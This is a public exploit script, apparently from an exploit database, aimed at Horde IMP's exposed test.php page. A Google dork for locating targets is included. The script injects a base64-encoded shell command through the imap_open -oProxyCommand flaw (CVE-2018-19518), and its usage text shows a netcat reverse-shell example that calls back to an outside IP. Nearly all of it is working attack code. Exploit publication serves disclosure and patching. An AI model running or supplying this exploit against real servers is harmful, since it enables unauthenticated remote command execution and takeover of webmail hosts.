# Google Dork: inurl:/imp/login.php
# Exploit Author: Paolo Serracino - Pietro Minniti - Damiano Proietti
# Vendor Homepage: https://www.horde.org/apps/imp/
# Software Link: https://www.horde.org/download/imp
# Version: All IMP versions
# Tested on: Debian/Ubuntu

import requests
import sys
import base64 
import random
import string 

&#039;&#039;&#039;
 --------------------------------------------------------------------------------------------
| Paolo Serracino - Pietro Minniti - Damiano Proietti - @OmnitechIT                           |
| Horde Imp Unauthenticated Command Execution via imap_open function in exposed debug page   |
 --------------------------------------------------------------------------------------------

Horde Imp, an application that comes with the Horde GroupWare/Webmail suite exposes an unauthenticated debug page with a form 
that permits IMAP requests to arbitrary hosts. The page is at http://horde_path/imp/test.php and should be deleted after installation.
Leveraging the CVE 2018-19518 and no input sanitization is possible to execute shell commands.
Tested on Debian/Ubuntu.
&#039;&#039;&#039;

def check(target):

   try:
      res_check = requests.get(target)
      if &#039;PHP Mail Server Support Test&#039; in res_check.text and &#039;PHP Major Version: 5.&#039; in res_check.text:
         print("[+] Target is most likely vulnerable")
         return True
      else:
         print("[-] Target doesn&#039;t look vulnerable")   
         sys.exit()
   
   except requests.exceptions.RequestException as e:
      print("[-] Connection Issue")   
   


def exploit(target,cmd):

   cmd= base64.b64encode(cmd)
   payload1 = random.choice(string.ascii_letters) 
   new_headers = ({&#039;User-Agent&#039;:&#039;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)&#039;,
                 &#039;Referer&#039;:target,
                 &#039;Cookie&#039;:&#039;Horde=klstwo9u52kw7iqy4i22i0iok1;auth_key=klstwo9u52kw7iqy4i22i0iok1;imp_key=klstwo9u52kw7iqy4i22i0iok1;&#039; 
                })

   res = requests.post(target,headers=new_headers,data=[(&#039;server&#039;,payload1 + &#039; -oProxyCommand=echo$IFS$()&#039; + cmd + &#039;|base64$IFS$()-d|sh}&#039;), #in order to avoid url encoding by requests
                                                        (&#039;port&#039;,&#039;143&#039;),
                                                        (&#039;user&#039;,&#039;a&#039;),
                                                        (&#039;passwd&#039;,&#039;a&#039;),
                                                        (&#039;server_type&#039;,&#039;imap&#039;),
                                                        (&#039;f_submit&#039;,&#039;Submit&#039;)
                                                        ])
   print(&#039;[+] Sent!&#039;)


if(len(sys.argv)) < 3:
 
   print("[+] First argument is the path of target&#039;s Horde test.php and second the payload as a shell command")
   print(&#039;[+] Enclose shell commands between double quotes&#039;)
   print(&#039;[+] example python horde_imap_cmd.py http://127.0.0.1/horde/imp/test.php "mknod /tmp/bk p; nc 192.168.1.17 443 0</tmp/bk | /bin/bash 1>/tmp/bk"&#039;)
   sys.exit()

target = sys.argv[1] #+ &#039;/imp/test.php&#039;
cmd = sys.argv[2]

if check(target):
   exploit(target,cmd)

